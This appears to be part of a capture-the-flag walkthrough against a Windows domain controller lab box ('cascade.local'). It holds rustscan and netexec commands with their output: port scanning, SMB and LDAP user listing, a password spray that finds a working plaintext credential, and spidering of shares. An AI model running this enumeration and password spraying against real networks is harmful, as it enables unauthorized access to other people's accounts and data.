## STEP 1
```sh
└─$ rustscan -a 10.129.188.71 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.188.71:53
Open 10.129.188.71:88
Open 10.129.188.71:135
Open 10.129.188.71:139
Open 10.129.188.71:389
Open 10.129.188.71:445
Open 10.129.188.71:636
Open 10.129.188.71:3268
Open 10.129.188.71:3269
Open 10.129.188.71:5985
Open 10.129.188.71:49154
Open 10.129.188.71:49155
Open 10.129.188.71:49158
Open 10.129.188.71:49157
Open 10.129.188.71:49163
10.129.188.71 -> [53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49158,49157,49163]
```


## STEP 2
```sh
└─$ netexec smb 10.129.188.71 --users                                    
SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
SMB         10.129.188.71   445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.188.71   445    CASC-DC1         CascGuest                     <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.188.71   445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0        
SMB         10.129.188.71   445    CASC-DC1         s.smith                       2020-01-28 19:58:05 0        
SMB         10.129.188.71   445    CASC-DC1         r.thompson                    2020-01-09 19:31:26 0        
SMB         10.129.188.71   445    CASC-DC1         util                          2020-01-13 02:07:11 0        
SMB         10.129.188.71   445    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 0        
SMB         10.129.188.71   445    CASC-DC1         s.hickson                     2020-01-13 01:24:27 0        
SMB         10.129.188.71   445    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 0        
SMB         10.129.188.71   445    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 0        
SMB         10.129.188.71   445    CASC-DC1         e.crowe                       2020-01-13 03:45:02 0        
SMB         10.129.188.71   445    CASC-DC1         b.hanson                      2020-01-13 16:35:39 0        
SMB         10.129.188.71   445    CASC-DC1         d.burman                      2020-01-13 16:36:12 0        
SMB         10.129.188.71   445    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 0        
SMB         10.129.188.71   445    CASC-DC1         j.allen                       2020-01-13 17:23:59 0        
SMB         10.129.188.71   445    CASC-DC1         i.croft                       2020-01-15 21:46:21 0        
SMB         10.129.188.71   445    CASC-DC1         [*] Enumerated 15 local users: CASCADE
```
```sh
└─$ netexec ldap 10.129.188.71 --active-users                  
LDAP        10.129.188.71   389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
LDAP        10.129.188.71   389    CASC-DC1         [*] Total records returned: 15, total 4 user(s) disabled
LDAP        10.129.188.71   389    CASC-DC1         -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                                            
LDAP        10.129.188.71   389    CASC-DC1         arksvc                        2020-01-09 11:18:20 15       
LDAP        10.129.188.71   389    CASC-DC1         s.smith                       2020-01-28 14:58:05 15       
LDAP        10.129.188.71   389    CASC-DC1         r.thompson                    2020-01-09 14:31:26 15       
LDAP        10.129.188.71   389    CASC-DC1         util                          2020-01-12 21:07:11 15       
LDAP        10.129.188.71   389    CASC-DC1         j.wakefield                   2020-01-09 15:34:44 15       
LDAP        10.129.188.71   389    CASC-DC1         s.hickson                     2020-01-12 20:24:27 14       
LDAP        10.129.188.71   389    CASC-DC1         j.goodhand                    2020-01-12 20:40:26 15       
LDAP        10.129.188.71   389    CASC-DC1         a.turnbull                    2020-01-12 20:43:13 15       
LDAP        10.129.188.71   389    CASC-DC1         d.burman                      2020-01-13 11:36:12 15       
LDAP        10.129.188.71   389    CASC-DC1         BackupSvc                     2020-01-13 11:37:03 15       
LDAP        10.129.188.71   389    CASC-DC1         j.allen                       2020-01-13 12:23:59 15
```
```sh
└─$ netexec ldap 10.129.188.71 --password-not-required
LDAP        10.129.188.71   389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
LDAP        10.129.188.71   389    CASC-DC1         User: a.turnbull Status: enabled
LDAP        10.129.188.71   389    CASC-DC1         User: CascGuest Status: disabled
```
```sh
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.129.188.71 -u userall.txt  -p 'rY4n5eva'     
SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
```


## STEP 3
```sh
└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva --shares
SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.188.71   445    CASC-DC1         [*] Enumerated shares
SMB         10.129.188.71   445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.188.71   445    CASC-DC1         -----           -----------     ------
SMB         10.129.188.71   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.188.71   445    CASC-DC1         Audit$                          
SMB         10.129.188.71   445    CASC-DC1         C$                              Default share
SMB         10.129.188.71   445    CASC-DC1         Data            READ            
SMB         10.129.188.71   445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.188.71   445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.188.71   445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.188.71   445    CASC-DC1         SYSVOL          READ            Logon server share 
              
└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva --share Data -M spider_plus 
SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.188.71   445    CASC-DC1         [*] Enumerated shares
SMB         10.129.188.71   445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.188.71   445    CASC-DC1         -----           -----------     ------
SMB         10.129.188.71   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.188.71   445    CASC-DC1         Audit$                          
SMB         10.129.188.71   445    CASC-DC1         C$                              Default share
SMB         10.129.188.71   445    CASC-DC1         Data            READ            
SMB         10.129.188.71   445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.188.71   445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.188.71   445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.188.71   445    CASC-DC1         SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.188.71.json".
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] SMB Shares:           8 (ADMIN$, Audit$, C$, Data, IPC$, NETLOGON, print$, SYSVOL)
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] SMB Readable Shares:  4 (Data, NETLOGON, print$, SYSVOL)
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Total folders found:  58
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Total files found:    20
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size average:    1.07 KB
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size min:        6 B
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size max:        5.83 KB
                
└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.188.71.json 
{
    "Data": {
        "IT/Email Archives/Meeting_Notes_June_2018.html": {
            "atime_epoch": "2020-01-15 20:08:46",
            "ctime_epoch": "2020-01-15 20:08:46",
            "mtime_epoch": "2020-01-28 13:00:30",
            "size": "2.46 KB"
        },
        "IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log": {
            "atime_epoch": "2020-01-10 11:19:20",
            "ctime_epoch": "2020-01-10 11:19:20",
            "mtime_epoch": "2020-01-28 20:19:11",
            "size": "1.27 KB"
        },
        "IT/Logs/DCs/dcdiag.log": {
            "atime_epoch": "2020-01-10 11:17:30",
            "ctime_epoch": "2020-01-10 11:17:30",
            "mtime_epoch": "2020-01-26 17:22:05",
            "size": "5.83 KB"
        },
        "IT/Temp/s.smith/VNC Install.reg": {
            "atime_epoch": "2020-01-28 14:27:43",
            "ctime_epoch": "2020-01-28 14:27:43",
            "mtime_epoch": "2020-01-28 15:00:01",
            "size": "2.62 KB"
        }
    },
    "NETLOGON": {
        "MapAuditDrive.vbs": {
            "atime_epoch": "2020-01-15 16:45:08",
            "ctime_epoch": "2020-01-15 16:45:08",
            "mtime_epoch": "2020-01-15 16:50:14",
            "size": "258 B"
        },
        "MapDataDrive.vbs": {
            "atime_epoch": "2020-01-15 16:50:28",
            "ctime_epoch": "2020-01-15 16:49:19",
            "mtime_epoch": "2020-01-15 16:51:03",
            "size": "255 B"
        }
    },
    "SYSVOL": {
        "cascade.local/Policies/{2906D621-7B58-40F1-AA47-4ED2AEF29484}/GPT.INI": {
            "atime_epoch": "2020-01-09 13:12:59",
            "ctime_epoch": "2020-01-09 13:12:59",
            "mtime_epoch": "2020-01-09 13:13:00",
            "size": "59 B"
        },
        "cascade.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-09 10:31:40",
            "ctime_epoch": "2020-01-09 10:31:40",
            "mtime_epoch": "2020-03-23 04:33:59",
            "size": "23 B"
        },
        "cascade.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-09 10:31:40",
            "ctime_epoch": "2020-01-09 10:31:40",
            "mtime_epoch": "2020-03-23 04:33:59",
            "size": "1.22 KB"
        },
        "cascade.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2020-01-09 10:48:03",
            "ctime_epoch": "2020-01-09 10:48:03",
            "mtime_epoch": "2020-01-09 10:48:03",
            "size": "2.72 KB"
        },
        "cascade.local/Policies/{322FEA29-156D-4476-8A06-1935A3525C1C}/GPO.cmt": {
            "atime_epoch": "2020-01-09 13:29:34",
            "ctime_epoch": "2020-01-09 13:29:34",
            "mtime_epoch": "2020-01-09 13:30:29",
            "size": "24 B"
        },
        "cascade.local/Policies/{322FEA29-156D-4476-8A06-1935A3525C1C}/GPT.INI": {
            "atime_epoch": "2020-01-09 10:50:16",
            "ctime_epoch": "2020-01-09 10:50:16",
            "mtime_epoch": "2020-01-28 17:07:51",
            "size": "64 B"
        },
        "cascade.local/Policies/{322FEA29-156D-4476-8A06-1935A3525C1C}/User/Scripts/scripts.ini": {
            "atime_epoch": "2020-01-09 14:52:44",
            "ctime_epoch": "2020-01-09 14:52:44",
            "mtime_epoch": "2020-01-28 17:07:51",
            "size": "6 B"
        },
        "cascade.local/Policies/{4026EDF8-DBDA-4AED-8266-5A04B80D9327}/GPT.INI": {
            "atime_epoch": "2020-01-09 14:42:31",
            "ctime_epoch": "2020-01-09 14:42:31",
            "mtime_epoch": "2020-01-09 14:42:31",
            "size": "59 B"
        },
        "cascade.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-09 10:31:40",
            "ctime_epoch": "2020-01-09 10:31:40",
            "mtime_epoch": "2020-01-26 12:12:15",
            "size": "23 B"
        },
        "cascade.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-09 10:31:40",
            "ctime_epoch": "2020-01-09 10:31:40",
            "mtime_epoch": "2020-01-26 12:12:15",
            "size": "3.99 KB"
        },
        "cascade.local/Policies/{820E48A7-D083-4C2D-B5F8-B24462924714}/GPT.INI": {
            "atime_epoch": "2020-01-09 13:33:51",
            "ctime_epoch": "2020-01-09 13:33:51",
            "mtime_epoch": "2020-01-09 13:34:03",
            "size": "59 B"
        },
        "cascade.local/Policies/{D67C2AD5-44C7-4468-BA4C-199E75B2F295}/GPT.INI": {
            "atime_epoch": "2020-01-09 14:42:40",
            "ctime_epoch": "2020-01-09 14:42:40",
            "mtime_epoch": "2020-01-09 14:42:40",
            "size": "59 B"
        },
        "cascade.local/scripts/MapAuditDrive.vbs": {
            "atime_epoch": "2020-01-15 16:45:08",
            "ctime_epoch": "2020-01-15 16:45:08",
            "mtime_epoch": "2020-01-15 16:50:14",
            "size": "258 B"
        },
        "cascade.local/scripts/MapDataDrive.vbs": {
            "atime_epoch": "2020-01-15 16:50:28",
            "ctime_epoch": "2020-01-15 16:49:19",
            "mtime_epoch": "2020-01-15 16:51:03",
            "size": "255 B"
        }
    }
}
```
